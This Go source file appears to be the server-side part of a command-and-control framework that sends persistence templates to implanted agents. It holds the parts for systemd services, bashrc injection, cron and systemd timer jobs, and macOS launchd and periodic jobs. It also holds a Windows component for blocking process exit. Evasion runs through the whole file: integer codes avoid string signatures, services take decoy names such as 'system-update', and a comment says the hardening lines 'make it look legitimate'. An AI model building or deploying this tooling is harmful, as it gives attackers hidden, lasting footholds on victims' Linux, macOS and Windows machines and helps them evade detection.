// internal/templates/persistence.go
package templates

import (
	"encoding/json"
)

// PersistenceTemplate represents server-side template data sent to agents
// Uses arrays instead of maps to avoid string keys in agent binaries
type PersistenceTemplate struct {
	Version   int      `json:"v"`   // Template version for future compatibility
	Type      int      `json:"t"`   // Template type as integer: 1=systemd, 2=bashrc, 3=cron, 4=launchd
	Templates []string `json:"tpl"` // Template strings indexed by position
	Params    []string `json:"p"`   // Parameters indexed by position
}

// Template type identifiers (integers avoid string signatures)
const (
	TypeSystemd = 1
	TypeBashrc  = 2
	TypeCron    = 3
	TypeLaunchd = 4
)

// ============================================================================
// SYSTEMD TEMPLATE INDICES (0-29)
// ============================================================================
const (
	IdxUnitHeader    = 0
	IdxDescPrefix    = 1
	IdxServiceSuffix = 2
	IdxAfterNetwork  = 3
	IdxWantsNetwork  = 4
	IdxServiceHeader = 5
	IdxTypeSimple    = 6
	IdxRestartAlways = 7
	IdxRestartSec    = 8
	IdxExecStart     = 9
	IdxStdOutNull    = 10
	IdxStdErrNull    = 11
	IdxSecComment    = 12
	IdxPrivateTmp    = 13
	IdxNoNewPrivs    = 14
	IdxProtectSys    = 15
	IdxProtectHome   = 16
	IdxReadWriteTmp  = 17
	IdxInstallHeader = 18
	IdxWantedBy      = 19
	// Systemd paths and strings
	IdxEtcSystemd           = 20 // /etc/systemd/system
	IdxDotConfig            = 21 // .config
	IdxSystemdDir           = 22 // systemd
	IdxUserDir              = 23 // user
	IdxServiceExt           = 24 // .service
	IdxMultiUserTargetWants = 25 // multi-user.target.wants
	IdxDefaultTargetWants   = 26 // default.target.wants
	IdxDefaultSvcName       = 27 // system-update
	IdxProcSelfExe          = 28 // /proc/self/exe
	_systemdEnd             = 29
)

// ============================================================================
// BASHRC TEMPLATE INDICES (30-49)
// ============================================================================
const (
	IdxBashIfSudo   = 30
	IdxBashIfPgrep  = 31
	IdxBashPgrepEnd = 32
	IdxBashNohup    = 33
	IdxBashNohupEnd = 34
	IdxBashFi       = 35
	IdxBashEndFi    = 36
	// RC file names
	IdxRcBashrc      = 37 // .bashrc
	IdxRcProfile     = 38 // .profile
	IdxRcBashProfile = 39 // .bash_profile
	IdxRcZshrc       = 40 // .zshrc
	// Detection patterns (for cleanup)
	IdxBashDetectPattern = 41 // if [ -z "$SUDO_COMMAND" ]; then
	_bashrcEnd           = 49
)

// ============================================================================
// CRON TEMPLATE INDICES (50-99)
// ============================================================================
const (
	// Script content
	IdxCronShebang     = 50
	IdxCronComment     = 51
	IdxCronDevNull     = 52
	IdxCronMaintHeader = 53
	IdxCronShellBash   = 54
	IdxCronPathEnv     = 55

	// Paths
	IdxCronEtcCronD      = 56
	IdxCronEtcAnacrontab = 57
	IdxCronEtcHourly     = 58
	IdxCronEtcDaily      = 59
	IdxCronEtcWeekly     = 60
	IdxCronEtcMonthly    = 61
	IdxCronSpoolCrontabs = 62
	IdxCronSpoolCron     = 63
	IdxCronSpoolTabs     = 64

	// Filenames
	IdxCronFileCheck  = 65
	IdxCronFileUpdate = 66
	IdxCronFileMaint  = 67

	// Intervals
	IdxCronIntHourly  = 68
	IdxCronIntDaily   = 69
	IdxCronIntWeekly  = 70
	IdxCronIntMonthly = 71
	IdxCronIntReboot  = 72

	// Systemd user timer
	IdxTimerUserDir     = 73
	IdxTimerHeader      = 74
	IdxTimerOnCalendar  = 75
	IdxTimerOnBootSec   = 76
	IdxTimerOnUnitSec   = 77
	IdxTimerPersistent  = 78
	IdxTimerExt         = 79
	IdxTimerDefaultName = 80

	// Cron methods (for dispatch - server transforms these)
	IdxCronMethodSpool    = 81
	IdxCronMethodCrond    = 82
	IdxCronMethodPeriodic = 83
	IdxCronMethodAnacron  = 84
	IdxCronMethodTimer    = 85
	IdxCronMethodAll      = 86

	// Cron actions
	IdxCronActionAdd    = 87
	IdxCronActionRemove = 88
	IdxCronActionList   = 89

	// Timer calendar values (systemd OnCalendar= values)
	IdxTimerCalHourly  = 90 // hourly
	IdxTimerCalDaily   = 91 // daily
	IdxTimerCalWeekly  = 92 // weekly
	IdxTimerCalMonthly = 93 // monthly
	IdxTimerCalBootMin = 94 // 1min (for OnBootSec)

	// Cron flags (short codes transformed by server)
	IdxCronFlagMethod   = 95 // -m
	IdxCronFlagUser     = 96 // -9
	IdxCronFlagInterval = 97 // -i
	IdxCronFlagCommand  = 98 // -6

	_cronEnd = 99
)

// ============================================================================
// PARAMETER INDICES (shared across template types)
// ============================================================================
const (
	ParamIdxServiceName = 0
	ParamIdxDescription = 1
	ParamIdxTarget      = 2
	ParamIdxUserService = 3
)

// ============================================================================
// CLR EXIT PREVENTION TEMPLATE INDICES (100-117)
// ============================================================================
const (
	// DLL names
	IdxClrDllMscoree  = 100 // mscoree.dll
	IdxClrDllMscorlib = 101 // mscorlib.dll
	IdxClrDllKernel32 = 102 // kernel32.dll
	IdxClrDllClr      = 103 // clr.dll
	IdxClrDllWinForms = 104 // System.Windows.Forms.dll

	// API names
	IdxClrApiGetModuleHandle  = 105 // GetModuleHandleW
	IdxClrApiGetProcAddress   = 106 // GetProcAddress
	IdxClrApiVirtualProtect   = 107 // VirtualProtect
	IdxClrApiExitProcess      = 108 // ExitProcess
	IdxClrApiTerminateProcess = 109 // TerminateProcess
	IdxClrApiGetCurrentProc   = 110 // GetCurrentProcess

	// CLR symbols
	IdxClrSymSystemNativeExit = 111 // SystemNative::Exit
	IdxClrSymExitMangled      = 112 // ?Exit@SystemNative@@SAXH@Z

	// Method name keys
	IdxClrKeyEnvExit  = 113 // Environment.Exit
	IdxClrKeyAppExit  = 114 // Application.Exit
	IdxClrKeyProcKill = 115 // Process.Kill
	IdxClrKeyExitProc = 116 // ExitProcess
	IdxClrKeyTermProc = 117 // TerminateProcess

	_clrEnd = 118
)

// ============================================================================
// PERSISTENCE METHODS AND FLAGS (200-219)
// ============================================================================
const (
	// Methods (short codes)
	IdxPersistMethodBashrc  = 200 // b
	IdxPersistMethodSystemd = 201 // s
	IdxPersistMethodCron    = 202 // c
	IdxPersistMethodRemove  = 203 // r

	// Flags (short codes transformed from user-friendly flags)
	IdxPersistFlagRaw         = 204 // -1
	IdxPersistFlagNoNohup     = 205 // -2
	IdxPersistFlagNoSilence   = 206 // -3
	IdxPersistFlagNoPgrep     = 207 // -4
	IdxPersistFlagNoSudoCheck = 208 // -5
	IdxPersistFlagCommand     = 209 // -6
	IdxPersistFlagFiles       = 210 // -7
	IdxPersistFlagFile        = 211 // -8
	IdxPersistFlagUser        = 212 // -9
	IdxPersistFlagName        = 213 // -n
	IdxPersistFlagAll         = 214 // -a

	// Misc
	IdxPersistAmpersand = 215 //  &

	_persistEnd = 219
)

// ============================================================================
// DARWIN PERSISTENCE TEMPLATE INDICES (220-279)
// ============================================================================
const (
	// Method names (220-223)
	IdxDarwinMethodRC       = 220 // rc
	IdxDarwinMethodLaunch   = 221 // launch
	IdxDarwinMethodLogin    = 222 // login
	IdxDarwinMethodPeriodic = 223 // periodic

	// Flag arguments (224-231)
	IdxDarwinFlagUser      = 224 // --user
	IdxDarwinFlagCommand   = 225 // --command
	IdxDarwinFlagFiles     = 226 // --files
	IdxDarwinFlagName      = 227 // --name
	IdxDarwinFlagSystem    = 228 // --system
	IdxDarwinFlagInterval  = 229 // --interval
	IdxDarwinFlagPath      = 230 // --path
	IdxDarwinFlagFrequency = 231 // --frequency

	// RC file names (232-235) - Darwin uses same RC files as Linux
	IdxDarwinRCZshrc       = 232 // .zshrc
	IdxDarwinRCBashProfile = 233 // .bash_profile
	IdxDarwinRCBashrc      = 234 // .bashrc
	IdxDarwinRCProfile     = 235 // .profile

	// Path prefix (236)
	IdxDarwinHomeTilde = 236 // ~/

	// LaunchAgent/Daemon paths (237-239)
	IdxDarwinLaunchDaemonsPath = 237 // /Library/LaunchDaemons/
	IdxDarwinLaunchAgentsPath  = 238 // Library/LaunchAgents
	IdxDarwinPlistExt          = 239 // .plist

	// Frequency values (240-242)
	IdxDarwinFreqDaily   = 240 // daily
	IdxDarwinFreqWeekly  = 241 // weekly
	IdxDarwinFreqMonthly = 242 // monthly

	// Periodic directories (243-245)
	IdxDarwinPeriodicDaily   = 243 // /etc/periodic/daily
	IdxDarwinPeriodicWeekly  = 244 // /etc/periodic/weekly
	IdxDarwinPeriodicMonthly = 245 // /etc/periodic/monthly

	// Plist template components (246-248)
	IdxDarwinTmplName  = 246 // plist
	IdxDarwinXMLHeader = 247 // <?xml version="1.0" encoding="UTF-8"?>
	IdxDarwinDTDLine   = 248 // <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">

	// Plist key names (249-255)
	IdxDarwinKeyLabel    = 249 // Label
	IdxDarwinKeyProgArgs = 250 // ProgramArguments
	IdxDarwinKeyRunAtLd  = 251 // RunAtLoad
	IdxDarwinKeyStartInt = 252 // StartInterval
	IdxDarwinKeyStdOut   = 253 // StandardOutPath
	IdxDarwinKeyStdErr   = 254 // StandardErrorPath
	IdxDarwinTmpPath     = 255 // /tmp/

	// XML tag components (256-268)
	IdxDarwinXO       = 256 // <
	IdxDarwinXC       = 257 // >
	IdxDarwinXCO      = 258 // </
	IdxDarwinXSC      = 259 // />
	IdxDarwinXDict    = 260 // dict
	IdxDarwinXKey     = 261 // key
	IdxDarwinXStr     = 262 // string
	IdxDarwinXArr     = 263 // array
	IdxDarwinXInt     = 264 // integer
	IdxDarwinXTrue    = 265 // true
	IdxDarwinXVer     = 266 //  version="1.0"
	IdxDarwinXOutExt  = 267 // .out
	IdxDarwinXErrExt  = 268 // .err

	// Periodic script components (269-273)
	IdxDarwinScriptPrefix = 269 // 999.
	IdxDarwinShebang      = 270 // #!/bin/sh
	IdxDarwinExitZero     = 271 // exit 0
	IdxDarwinPeriodic     = 272 // Periodic
	IdxDarwinTask         = 273 // task

	// Command name (274)
	IdxDarwinCmdName = 274 // persist

	_darwinPersistEnd = 279
)

// ============================================================================
// TEMPLATE SIZE (ensures all indices have values)
// ============================================================================
const TemplateSize = 280

// GetLinuxSystemdTemplate returns the systemd service template for Linux persistence
func GetLinuxSystemdTemplate(serviceName, description string, userService bool) *PersistenceTemplate {
	target := "multi-user.target"
	if userService {
		target = "default.target"
	}

	if description == "" {
		if userService {
			description = "User Session Manager"
		} else {
			description = "System Update Monitor"
		}
	}

	if serviceName == "" {
		serviceName = "system-update"
	}

	// Pre-allocate array
	tpl := make([]string, TemplateSize)

	// Systemd unit content
	tpl[IdxUnitHeader] = "[Unit]"
	tpl[IdxDescPrefix] = "Description="
	tpl[IdxServiceSuffix] = " Service"
	tpl[IdxAfterNetwork] = "After=network.target network-online.target"
	tpl[IdxWantsNetwork] = "Wants=network-online.target"
	tpl[IdxServiceHeader] = "[Service]"
	tpl[IdxTypeSimple] = "Type=simple"
	tpl[IdxRestartAlways] = "Restart=always"
	tpl[IdxRestartSec] = "RestartSec=60"
	tpl[IdxExecStart] = "ExecStart="
	tpl[IdxStdOutNull] = "StandardOutput=null"
	tpl[IdxStdErrNull] = "StandardError=null"
	tpl[IdxSecComment] = "# Security hardening (makes it look legitimate)"
	tpl[IdxPrivateTmp] = "PrivateTmp=yes"
	tpl[IdxNoNewPrivs] = "NoNewPrivileges=true"
	tpl[IdxProtectSys] = "ProtectSystem=strict"
	tpl[IdxProtectHome] = "ProtectHome=read-only"
	tpl[IdxReadWriteTmp] = "ReadWritePaths=/tmp"
	tpl[IdxInstallHeader] = "[Install]"
	tpl[IdxWantedBy] = "WantedBy="

	// Systemd paths
	tpl[IdxEtcSystemd] = "/etc/systemd/system"
	tpl[IdxDotConfig] = ".config"
	tpl[IdxSystemdDir] = "systemd"
	tpl[IdxUserDir] = "user"
	tpl[IdxServiceExt] = ".service"
	tpl[IdxMultiUserTargetWants] = "multi-user.target.wants"
	tpl[IdxDefaultTargetWants] = "default.target.wants"
	tpl[IdxDefaultSvcName] = "system-update"
	tpl[IdxProcSelfExe] = "/proc/self/exe"

	// Also include bashrc templates for persist remove bashrc
	tpl[IdxBashIfSudo] = "if [ -z \"$SUDO_COMMAND\" ]; then"
	tpl[IdxBashIfPgrep] = "    if ! pgrep -f \""
	tpl[IdxBashPgrepEnd] = "\" > /dev/null 2>&1; then"
	tpl[IdxBashNohup] = "        (nohup "
	tpl[IdxBashNohupEnd] = " > /dev/null 2>&1 &) 2>/dev/null"
	tpl[IdxBashFi] = "    fi"
	tpl[IdxBashEndFi] = "fi"
	tpl[IdxRcBashrc] = ".bashrc"
	tpl[IdxRcProfile] = ".profile"
	tpl[IdxRcBashProfile] = ".bash_profile"
	tpl[IdxRcZshrc] = ".zshrc"
	tpl[IdxBashDetectPattern] = "if [ -z \"$SUDO_COMMAND\" ]; then"

	// Persist methods and flags (common across all templates)
	tpl[IdxPersistMethodBashrc] = "b"
	tpl[IdxPersistMethodSystemd] = "s"
	tpl[IdxPersistMethodCron] = "c"
	tpl[IdxPersistMethodRemove] = "r"
	tpl[IdxPersistFlagRaw] = "-1"
	tpl[IdxPersistFlagNoNohup] = "-2"
	tpl[IdxPersistFlagNoSilence] = "-3"
	tpl[IdxPersistFlagNoPgrep] = "-4"
	tpl[IdxPersistFlagNoSudoCheck] = "-5"
	tpl[IdxPersistFlagCommand] = "-6"
	tpl[IdxPersistFlagFiles] = "-7"
	tpl[IdxPersistFlagFile] = "-8"
	tpl[IdxPersistFlagUser] = "-9"
	tpl[IdxPersistFlagName] = "-n"
	tpl[IdxPersistFlagAll] = "-a"
	tpl[IdxPersistAmpersand] = " &"

	// Params
	params := make([]string, 4)
	params[ParamIdxServiceName] = serviceName
	params[ParamIdxDescription] = description
	params[ParamIdxTarget] = target
	params[ParamIdxUserService] = boolToString(userService)

	return &PersistenceTemplate{
		Version:   2, // Version 2 = array-based
		Type:      TypeSystemd,
		Templates: tpl,
		Params:    params,
	}
}

// GetLinuxBashrcTemplate returns the bashrc injection template for Linux persistence
func GetLinuxBashrcTemplate() *PersistenceTemplate {
	tpl := make([]string, TemplateSize)

	// Bashrc injection templates
	tpl[IdxBashIfSudo] = "if [ -z \"$SUDO_COMMAND\" ]; then"
	tpl[IdxBashIfPgrep] = "    if ! pgrep -f \""
	tpl[IdxBashPgrepEnd] = "\" > /dev/null 2>&1; then"
	tpl[IdxBashNohup] = "        (nohup "
	tpl[IdxBashNohupEnd] = " > /dev/null 2>&1 &) 2>/dev/null"
	tpl[IdxBashFi] = "    fi"
	tpl[IdxBashEndFi] = "fi"

	// RC file names
	tpl[IdxRcBashrc] = ".bashrc"
	tpl[IdxRcProfile] = ".profile"
	tpl[IdxRcBashProfile] = ".bash_profile"
	tpl[IdxRcZshrc] = ".zshrc"

	// Detection pattern for cleanup
	tpl[IdxBashDetectPattern] = "if [ -z \"$SUDO_COMMAND\" ]; then"

	// Also include /proc/self/exe for default command
	tpl[IdxProcSelfExe] = "/proc/self/exe"

	// Persist methods and flags (common across all templates)
	tpl[IdxPersistMethodBashrc] = "b"
	tpl[IdxPersistMethodSystemd] = "s"
	tpl[IdxPersistMethodCron] = "c"
	tpl[IdxPersistMethodRemove] = "r"
	tpl[IdxPersistFlagRaw] = "-1"
	tpl[IdxPersistFlagNoNohup] = "-2"
	tpl[IdxPersistFlagNoSilence] = "-3"
	tpl[IdxPersistFlagNoPgrep] = "-4"
	tpl[IdxPersistFlagNoSudoCheck] = "-5"
	tpl[IdxPersistFlagCommand] = "-6"
	tpl[IdxPersistFlagFiles] = "-7"
	tpl[IdxPersistFlagFile] = "-8"
	tpl[IdxPersistFlagUser] = "-9"
	tpl[IdxPersistFlagName] = "-n"
	tpl[IdxPersistFlagAll] = "-a"
	tpl[IdxPersistAmpersand] = " &"

	return &PersistenceTemplate{
		Version:   2,
		Type:      TypeBashrc,
		Templates: tpl,
		Params:    []string{},
	}
}

// GetLinuxCronTemplate returns the cron persistence template for Linux
func GetLinuxCronTemplate() *PersistenceTemplate {
	tpl := make([]string, TemplateSize)

	// Script content
	tpl[IdxCronShebang] = "#!/bin/bash"
	tpl[IdxCronComment] = "# Added by system at"
	tpl[IdxCronDevNull] = ">/dev/null 2>&1"
	tpl[IdxCronMaintHeader] = "# System maintenance task"
	tpl[IdxCronShellBash] = "SHELL=/bin/bash"
	tpl[IdxCronPathEnv] = "PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin"

	// Paths
	tpl[IdxCronEtcCronD] = "/etc/cron.d"
	tpl[IdxCronEtcAnacrontab] = "/etc/anacrontab"
	tpl[IdxCronEtcHourly] = "/etc/cron.hourly"
	tpl[IdxCronEtcDaily] = "/etc/cron.daily"
	tpl[IdxCronEtcWeekly] = "/etc/cron.weekly"
	tpl[IdxCronEtcMonthly] = "/etc/cron.monthly"
	tpl[IdxCronSpoolCrontabs] = "/var/spool/cron/crontabs/%s"
	tpl[IdxCronSpoolCron] = "/var/spool/cron/%s"
	tpl[IdxCronSpoolTabs] = "/var/spool/cron/tabs/%s"

	// Filenames
	tpl[IdxCronFileCheck] = "system-check"
	tpl[IdxCronFileUpdate] = "system-update"
	tpl[IdxCronFileMaint] = "system-maint"

	// Intervals
	tpl[IdxCronIntHourly] = "@hourly"
	tpl[IdxCronIntDaily] = "@daily"
	tpl[IdxCronIntWeekly] = "@weekly"
	tpl[IdxCronIntMonthly] = "@monthly"
	tpl[IdxCronIntReboot] = "@reboot"

	// Systemd user timer
	tpl[IdxTimerUserDir] = ".config/systemd/user"
	tpl[IdxTimerHeader] = "[Timer]"
	tpl[IdxTimerOnCalendar] = "OnCalendar="
	tpl[IdxTimerOnBootSec] = "OnBootSec="
	tpl[IdxTimerOnUnitSec] = "OnUnitActiveSec="
	tpl[IdxTimerPersistent] = "Persistent=true"
	tpl[IdxTimerExt] = ".timer"
	tpl[IdxTimerDefaultName] = "update-manager"

	// Timer calendar values (systemd OnCalendar= values)
	tpl[IdxTimerCalHourly] = "hourly"
	tpl[IdxTimerCalDaily] = "daily"
	tpl[IdxTimerCalWeekly] = "weekly"
	tpl[IdxTimerCalMonthly] = "monthly"
	tpl[IdxTimerCalBootMin] = "1min"

	// Cron methods (short codes for dispatch)
	tpl[IdxCronMethodSpool] = "sp"
	tpl[IdxCronMethodCrond] = "cd"
	tpl[IdxCronMethodPeriodic] = "pr"
	tpl[IdxCronMethodAnacron] = "an"
	tpl[IdxCronMethodTimer] = "tm"
	tpl[IdxCronMethodAll] = "all"

	// Cron actions
	tpl[IdxCronActionAdd] = "add"
	tpl[IdxCronActionRemove] = "remove"
	tpl[IdxCronActionList] = "list"

	// Cron flags (short codes)
	tpl[IdxCronFlagMethod] = "-m"
	tpl[IdxCronFlagUser] = "-9"
	tpl[IdxCronFlagInterval] = "-i"
	tpl[IdxCronFlagCommand] = "-6"

	// Also include /proc/self/exe
	tpl[IdxProcSelfExe] = "/proc/self/exe"

	// Persist methods and flags (common across all templates)
	tpl[IdxPersistMethodBashrc] = "b"
	tpl[IdxPersistMethodSystemd] = "s"
	tpl[IdxPersistMethodCron] = "c"
	tpl[IdxPersistMethodRemove] = "r"
	tpl[IdxPersistFlagRaw] = "-1"
	tpl[IdxPersistFlagNoNohup] = "-2"
	tpl[IdxPersistFlagNoSilence] = "-3"
	tpl[IdxPersistFlagNoPgrep] = "-4"
	tpl[IdxPersistFlagNoSudoCheck] = "-5"
	tpl[IdxPersistFlagCommand] = "-6"
	tpl[IdxPersistFlagFiles] = "-7"
	tpl[IdxPersistFlagFile] = "-8"
	tpl[IdxPersistFlagUser] = "-9"
	tpl[IdxPersistFlagName] = "-n"
	tpl[IdxPersistFlagAll] = "-a"
	tpl[IdxPersistAmpersand] = " &"

	return &PersistenceTemplate{
		Version:   2,
		Type:      TypeCron,
		Templates: tpl,
		Params:    []string{},
	}
}

// ToJSON serializes the template to JSON bytes
func (t *PersistenceTemplate) ToJSON() ([]byte, error) {
	return json.Marshal(t)
}

// ParsePersistenceTemplate deserializes JSON to a PersistenceTemplate
func ParsePersistenceTemplate(data []byte) (*PersistenceTemplate, error) {
	var t PersistenceTemplate
	if err := json.Unmarshal(data, &t); err != nil {
		return nil, err
	}
	return &t, nil
}

func boolToString(b bool) string {
	if b {
		return "true"
	}
	return "false"
}

// GetDarwinPersistenceTemplate returns the persistence template for Darwin/macOS agents
func GetDarwinPersistenceTemplate() *PersistenceTemplate {
	tpl := make([]string, TemplateSize)

	// Method names
	tpl[IdxDarwinMethodRC] = "rc"
	tpl[IdxDarwinMethodLaunch] = "launch"
	tpl[IdxDarwinMethodLogin] = "login"
	tpl[IdxDarwinMethodPeriodic] = "periodic"

	// Flag arguments
	tpl[IdxDarwinFlagUser] = "--user"
	tpl[IdxDarwinFlagCommand] = "--command"
	tpl[IdxDarwinFlagFiles] = "--files"
	tpl[IdxDarwinFlagName] = "--name"
	tpl[IdxDarwinFlagSystem] = "--system"
	tpl[IdxDarwinFlagInterval] = "--interval"
	tpl[IdxDarwinFlagPath] = "--path"
	tpl[IdxDarwinFlagFrequency] = "--frequency"

	// RC file names
	tpl[IdxDarwinRCZshrc] = ".zshrc"
	tpl[IdxDarwinRCBashProfile] = ".bash_profile"
	tpl[IdxDarwinRCBashrc] = ".bashrc"
	tpl[IdxDarwinRCProfile] = ".profile"

	// Path prefix
	tpl[IdxDarwinHomeTilde] = "~/"

	// LaunchAgent/Daemon paths
	tpl[IdxDarwinLaunchDaemonsPath] = "/Library/LaunchDaemons/"
	tpl[IdxDarwinLaunchAgentsPath] = "Library/LaunchAgents"
	tpl[IdxDarwinPlistExt] = ".plist"

	// Frequency values
	tpl[IdxDarwinFreqDaily] = "daily"
	tpl[IdxDarwinFreqWeekly] = "weekly"
	tpl[IdxDarwinFreqMonthly] = "monthly"

	// Periodic directories
	tpl[IdxDarwinPeriodicDaily] = "/etc/periodic/daily"
	tpl[IdxDarwinPeriodicWeekly] = "/etc/periodic/weekly"
	tpl[IdxDarwinPeriodicMonthly] = "/etc/periodic/monthly"

	// Plist template components
	tpl[IdxDarwinTmplName] = "plist"
	tpl[IdxDarwinXMLHeader] = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
	tpl[IdxDarwinDTDLine] = "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">"

	// Plist key names
	tpl[IdxDarwinKeyLabel] = "Label"
	tpl[IdxDarwinKeyProgArgs] = "ProgramArguments"
	tpl[IdxDarwinKeyRunAtLd] = "RunAtLoad"
	tpl[IdxDarwinKeyStartInt] = "StartInterval"
	tpl[IdxDarwinKeyStdOut] = "StandardOutPath"
	tpl[IdxDarwinKeyStdErr] = "StandardErrorPath"
	tpl[IdxDarwinTmpPath] = "/tmp/"

	// XML tag components
	tpl[IdxDarwinXO] = "<"
	tpl[IdxDarwinXC] = ">"
	tpl[IdxDarwinXCO] = "</"
	tpl[IdxDarwinXSC] = "/>"
	tpl[IdxDarwinXDict] = "dict"
	tpl[IdxDarwinXKey] = "key"
	tpl[IdxDarwinXStr] = "string"
	tpl[IdxDarwinXArr] = "array"
	tpl[IdxDarwinXInt] = "integer"
	tpl[IdxDarwinXTrue] = "true"
	tpl[IdxDarwinXVer] = " version=\"1.0\""
	tpl[IdxDarwinXOutExt] = ".out"
	tpl[IdxDarwinXErrExt] = ".err"

	// Periodic script components
	tpl[IdxDarwinScriptPrefix] = "999."
	tpl[IdxDarwinShebang] = "#!/bin/sh"
	tpl[IdxDarwinExitZero] = "exit 0"
	tpl[IdxDarwinPeriodic] = "Periodic"
	tpl[IdxDarwinTask] = "task"

	// Command name
	tpl[IdxDarwinCmdName] = "persist"

	return &PersistenceTemplate{
		Version:   2,
		Type:      TypeLaunchd,
		Templates: tpl,
		Params:    []string{},
	}
}

// GetWindowsCLRTemplate returns the CLR exit prevention template for Windows agents
func GetWindowsCLRTemplate() *PersistenceTemplate {
	tpl := make([]string, TemplateSize)

	// DLL names
	tpl[IdxClrDllMscoree] = "mscoree.dll"
	tpl[IdxClrDllMscorlib] = "mscorlib.dll"
	tpl[IdxClrDllKernel32] = "kernel32.dll"
	tpl[IdxClrDllClr] = "clr.dll"
	tpl[IdxClrDllWinForms] = "System.Windows.Forms.dll"

	// API names
	tpl[IdxClrApiGetModuleHandle] = "GetModuleHandleW"
	tpl[IdxClrApiGetProcAddress] = "GetProcAddress"
	tpl[IdxClrApiVirtualProtect] = "VirtualProtect"
	tpl[IdxClrApiExitProcess] = "ExitProcess"
	tpl[IdxClrApiTerminateProcess] = "TerminateProcess"
	tpl[IdxClrApiGetCurrentProc] = "GetCurrentProcess"

	// CLR symbols
	tpl[IdxClrSymSystemNativeExit] = "SystemNative::Exit"
	tpl[IdxClrSymExitMangled] = "?Exit@SystemNative@@SAXH@Z"

	// Method name keys
	tpl[IdxClrKeyEnvExit] = "Environment.Exit"
	tpl[IdxClrKeyAppExit] = "Application.Exit"
	tpl[IdxClrKeyProcKill] = "Process.Kill"
	tpl[IdxClrKeyExitProc] = "ExitProcess"
	tpl[IdxClrKeyTermProc] = "TerminateProcess"

	return &PersistenceTemplate{
		Version:   2,
		Type:      0, // CLR type (0 = special/internal)
		Templates: tpl,
		Params:    []string{},
	}
}
